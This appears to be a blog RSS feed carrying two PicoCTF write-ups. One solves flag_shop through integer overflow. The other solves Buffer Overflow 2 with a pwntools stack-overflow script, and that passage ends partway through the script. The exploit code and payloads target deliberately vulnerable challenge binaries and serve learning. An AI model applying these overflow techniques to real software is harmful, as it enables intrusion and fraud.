<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>Code Review on Ep1cac</title>
    <link>http://localhost:1313/tags/code-review/</link>
    <description>Recent content in Code Review on Ep1cac</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>Ep1cac</copyright>
    <lastBuildDate>Wed, 20 Nov 2024 14:26:45 -0600</lastBuildDate><atom:link href="http://localhost:1313/tags/code-review/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.svg</icon>
    
    
    <item>
      <title>PicoCTF: flag_shop</title>
      <link>http://localhost:1313/posts/flag_shop/</link>
      <pubDate>Wed, 20 Nov 2024 14:26:45 -0600</pubDate>
      
      <guid>http://localhost:1313/posts/flag_shop/</guid>
      <description><![CDATA[<h3 id="description">Description</h3>
<p>flag_shop is a challenge on PicoCTF where an integer overflow vulnerability allows for the purchase of an 1337 flag where we otherwise would have insufficient funds.</p>
<h3 id="walkthrough">Walkthrough</h3>
<h4 id="functionality-testing">Functionality Testing</h4>
<p>Connecting to the Pico server, we get a menu with several options.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ nc jupiter.challenges.picoctf.org 9745
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
</code></pre><p>We can see our account balance.</p>
<pre tabindex="0"><code> Enter a menu selection
1



 Balance: 1100 
</code></pre><p>We can also buy flags, of which there are two options. Options 1 costs 900 each, whereas option 2, the &ldquo;1337 flag&rdquo;, costs 100000 each.</p>
<pre tabindex="0"><code> Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
</code></pre><pre tabindex="0"><code>2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one
</code></pre><p>We are asked to buy a flag, presumably the 1337 flag, so let&rsquo;s get started.</p>
<h4 id="code-review">Code Review</h4>
<p>The first thing that caught my eye was the usage the unsecure <code>scanf()</code>. <code>scanf()</code> takes data from
standard input and stores it to the address of a variable. However, it does not set a limit on the size of user input, meaning
it is vulnerable to overflow. For this challenge, I did not need to exploit <code>scanf()</code>, but it is still a vulnerability worth
keeping in mind.</p>
<p>We also see that the <code>store.c</code> uses an integer to store the total cost of the flags in
<code>total_cost</code>, meaning it can be interpreted as positive or negative. <code>total_cost</code> is derived by multiplying the cost of flag 1
(900) with the number of flags our user wants to buy, so the number of flags we buy could flip the most significant bit of <code>total_cost</code> to 1,
turning it into a negative number.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(auction_choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;These knockoff Flags cost 900 each, enter desired quantity</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">int</span> number_flags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fflush</span>(stdin);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>number_flags);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(number_flags <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">int</span> total_cost <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                    total_cost <span style="color:#f92672">=</span> <span style="color:#ae81ff">900</span><span style="color:#f92672">*</span>number_flags;
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">The final cost is: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, total_cost);
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span>(total_cost <span style="color:#f92672">&lt;=</span> account_balance){
</span></span><span style="display:flex;"><span>                        account_balance <span style="color:#f92672">=</span> account_balance <span style="color:#f92672">-</span> total_cost;
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Your current balance after transaction: %d</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, account_balance);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not enough funds to complete purchase</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>                    }   
</span></span><span style="display:flex;"><span>                }   
</span></span><span style="display:flex;"><span>            }
</span></span></code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>In two&rsquo;s complement, the most significant bit, or leftmost digit determines whether a number is positive (0) or negative (1).
When our total cost ends up being greater than the maximum positive integer, the cost becomes negative if the most significant bit is 1.
Since the price of a flag is 900, we can overflow our cost by buying <code>maximum_integer/price_per_flag</code> flags. Of course, this value needs to be
rounded up (or +1 if the quotient is a whole number).</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ python3
Python 3.12.6 (main, Sep  7 2024, 14:20:15) [GCC 14.2.0] on linux
Type &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.
&gt;&gt;&gt; import math
&gt;&gt;&gt; math.ceil(2147483647/900)
2386093
&gt;&gt;&gt; 2147483647/900
2386092.941111111
</code></pre><p>However, when I try to buy 2386093 flags, I am thrown deep into debt!</p>
<pre tabindex="0"><code>These knockoff Flags cost 900 each, enter desired quantity
2386093

The final cost is: -2147483596

Your current balance after transaction: -2147482600
</code></pre><p>Let us figure out why this is happening. I&rsquo;ve provided a script below to find the binary representation of an integer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;strings.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getBin</span>(<span style="color:#66d9ef">int</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) 
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Usage: %s &lt;num&gt;&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">getBin</span>(<span style="color:#a6e22e">atoi</span>(argv[<span style="color:#ae81ff">1</span>]));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getBin</span>(<span style="color:#66d9ef">int</span> num)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> bin[<span style="color:#ae81ff">33</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        bin[index] <span style="color:#f92672">=</span> (num <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">48</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">30</span>; i <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>                index<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">&amp;</span> i <span style="color:#f92672">?</span> (bin[index] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>) <span style="color:#f92672">:</span> (bin[index] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        bin[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Number: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, num);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Binary: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bin);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Calculating our remaining funds, we get 2147483596.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ ./int2bin $(( 0-2386093*900  ))
Number: 2147483596
Binary: 01111111111111111111111111001100
</code></pre><p>However, we start with 1100 in our balance, not 0. If we recalculate our balance with that accounted for, we get -2147482600.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ ./int2bin $(( 1100-2386093*900  ))
Number: -2147482600
Binary: 10000000000000000000010000011000
</code></pre><p>The easiest way to fix this debacle would be to add 1100/900 when calculating the number of flags we need to buy since
we will need to overflow an additional 1100 for flags that cost 900 each.</p>
<pre tabindex="0"><code>&gt;&gt;&gt; math.ceil(2147483647/900+1100/900)
2386095
</code></pre><p>And now we have 2147482896 in our account after the transaction&hellip;</p>
<pre tabindex="0"><code>These knockoff Flags cost 900 each, enter desired quantity
2386095

The final cost is: -2147481796

Your current balance after transaction: 2147482896
</code></pre><p>&hellip;and buy the 1337 flag.</p>
<pre tabindex="0"><code>Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_&lt;redacted&gt;}
Welcome to the flag exchange
We sell flags
</code></pre>]]></description>
      
    </item>
    
    
    
    <item>
      <title>PicoCTF: Buffer Overflow 2</title>
      <link>http://localhost:1313/posts/pico_buff2/</link>
      <pubDate>Wed, 09 Oct 2024 14:23:13 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/pico_buff2/</guid>
      <description><![CDATA[<h3 id="description">Description</h3>
<p>Buffer Overflow 2 is a binary exploitation challenge that involves overflowing a buffer to not only call the win() function, but also to successfully pass the necessary arguments to it.</p>
<h3 id="walkthrough">Walkthrough</h3>
<p>After downloading the vulnerable binary and its source code, the first thing I did was to view the source code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFSIZE 100
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FLAGSIZE 64
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg2) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(buf,FLAGSIZE,f);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xCAFEF00D</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xF00DF00D</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(buf);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[BUFSIZE];
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(buf);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(buf);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">gid_t</span> gid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresgid</span>(gid, gid, gid);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Please enter your string: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vuln</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It is apparent that the binary is using the vulnerable <code>gets()</code>
function with a buffer size of 100 bytes. We will need to overflow the buffer and
call <code>win()</code> as well as pass in two arguments, <code>0xCAFEF00D</code> and
<code>0XF00DF00D</code>, in order to complete this challenge.</p>
<p>We can also see that we need a dummy flag in order for the program to execute correctly.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Writeups/pico/buff2]
└─$ echo &#39;pico{debug}&#39; &gt; flag.txt
</code></pre><p>To overflow the buffer, we first need to find the offset of the eip register. eip stands for
&ldquo;Extended Instruction Pointer&rdquo; and as its name suggests, points to the next instruction to be
executed. We want to write the address of <code>win()</code> to it. To find the address,
we can analyze <code>vuln</code> in gdb&hellip;</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Writeups/pico/buff2]
└─$ gdb vuln
</code></pre><p>&hellip; and find the buffer allocation.</p>
<p><img src="/img/pico/buff2/vuln_gets_alloc.png" alt="GDB vuln buffer size"></p>
<p>Notice that the address of offset <code>ebp-0x6c</code> is pushed onto the stack and is
read by <code>gets()</code>. This means that after calling the <code>gets</code> function, there will be
108 (0x6c) bytes of buffer between the start of the buffer and the <code>ebp</code> register. Note
that the 108 bytes allocated differ from the 100-byte buffer declared in <code>vuln.c</code>.
Discrepancies like this are usually caused by padding or local variables.</p>
<div style="display: flex; justify-content: center;">
    <table>
        <table>
  <thead>
      <tr>
          <th style="text-align: left">High Address</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">&hellip;</td>
      </tr>
      <tr>
          <td style="text-align: left">eip (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">ebp (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">buffer + padding (108 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">&hellip;</td>
      </tr>
      <tr>
          <td style="text-align: left">Low Address</td>
      </tr>
  </tbody>
</table>

    </table>
</div>
<p><code>eip</code> is at a higher address immediately after <code>ebp</code>. Since <code>ebp</code> is a 4 byte register,
<code>eip</code> is 112 (108 + 4) bytes from the start of the buffer. We will therefore need 112 bytes of padding
in our payload before <code>eip</code> starts being overwritten.</p>
<p>Preliminary payload: 112 bytes padding + address of win().</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>addr_main <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>		padding,
</span></span><span style="display:flex;"><span>		addr_win
</span></span><span style="display:flex;"><span>		]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>I didn&rsquo;t get a clear indication as to whether my payload succeeded, so I added a breakpoint
at the <code>win()</code> function through gdb. If <code>win()</code> is called, the program will pause at the breakpoint.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>addr_win <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>		padding,
</span></span><span style="display:flex;"><span>		addr_win
</span></span><span style="display:flex;"><span>		]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>g <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>attach(p, gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b *win
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        r &lt; payload
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img src="/img/pico/buff2/win_stop.png" alt="win() function stop"></p>
<p>We do break, meaning our exploit successfully called <code>win()</code>. Now, we need to add
the arguments <code>0XCAFEF00D</code> and <code>0XF00DF00D</code>. Let us take a look at the stack
frame for <code>win()</code>.</p>
<div style="display: flex; justify-content: center;">
    <table>
        <table>
  <thead>
      <tr>
          <th style="text-align: left">High Address</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">&hellip;</td>
      </tr>
      <tr>
          <td style="text-align: left">arg2 (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">arg1 (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">eip (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">ebp (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">&hellip;</td>
      </tr>
      <tr>
          <td style="text-align: left">Low Address</td>
      </tr>
  </tbody>
</table>

    </table>
</div>
<p>Unlike x64 binaries, all function arguments in x86 programs are passed directly onto the stack.
After jumping to <code>win()</code>, we will also need to overflow <code>eip</code> before we can pass in arg1 and arg2.
In my exploit script I set <code>eip</code> to be overflowed with the address of <code>main()</code> for the sake of
having a valid return address, but any 4 byte value should work since the flag is being printed directly in <code>win()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>addr_win <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])
</span></span><span style="display:flex;"><span>addr_main <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xCAFEF00D</span>)
</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xF00DF00D</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>        padding,
</span></span><span style="display:flex;"><span>        addr_win,
</span></span><span style="display:flex;"><span>        addr_main,
</span></span><span style="display:flex;"><span>        arg1,
</span></span><span style="display:flex;"><span>        arg2
</span></span><span style="display:flex;"><span>        ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img src="/img/pico/buff2/local_flag.png" alt="Local binary flag"></p>
<p>Our exploit was successful. Now all that&rsquo;s left to do is to change the target from
the local binary to the remote pico server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;saturn.picoctf.net&#34;</span>, <span style="color:#ae81ff">54042</span>) <span style="color:#75715e"># Changed from binary to pico server.</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>
